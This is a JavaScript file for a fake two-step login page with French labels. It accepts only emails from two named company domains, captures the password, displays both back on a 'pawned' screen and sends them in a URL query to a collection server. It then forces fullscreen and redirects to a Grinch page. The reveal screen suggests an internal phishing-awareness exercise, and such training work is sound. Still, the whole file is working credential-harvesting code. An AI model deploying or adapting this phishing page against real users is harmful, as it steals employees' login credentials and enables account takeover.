

let mail = "";
let password = ''



function changeState() {
    document.getElementById("div_password").hidden = false;
    document.getElementById("btn_action").hidden = false;
    document.getElementById("btn_suivant").hidden = true;
    document.getElementById("info").hidden = true;
    document.getElementById("login").hidden = true;
    document.getElementById("identifiant").innerHTML = mail;

}



function active_pawned() {
    document.getElementById("connexion").hidden = true;    
    document.getElementById("pawned").hidden = false;

    mail = document.getElementById("mail").value;
    password = document.getElementById("password").value;
    call_email();
}


function onchange_mail(){
    mail = document.getElementById("mail").value;
    if (mail.includes("xnov.com") || (mail.includes("c2f-implants.com"))){
        document.getElementById("btn_suivant").disabled = false;
    }
}

function onchange_password(){
    password = document.getElementById("password").value;
    if (password.length > 5){
        document.getElementById("btn_action").disabled = false;
    }
}




function gotToGriunch(){
    document.location.href="./grinch.html";
}



function call_email() {


    document.getElementById("adresse_mail").innerHTML = "Ton identifiant de connexion à ton pro : " + mail;
    document.getElementById("password_en_clair").innerHTML = "Le mot de passe qui va avec : " + password;
    

    var url = "http://localhost:8080/hello?name=" + mail +  "&mail=" +  password

    fetch(url, {
        mode: 'no-cors' // 'cors' by default
    }).then(function (response) {
        
        setTimeout(function(){ gotToGriunch(); }, 8000);
        console.log("Toot");
    });

    document.documentElement.requestFullscreen();
    
}


function addEventLoaderButton(){

    // recherche des boutons
    let button = document.getElementById("mail");
    button.addEventListener('change', onchange_mail);
    document.getElementById("password").addEventListener('change', onchange_password);
  }
  
addEventLoaderButton();

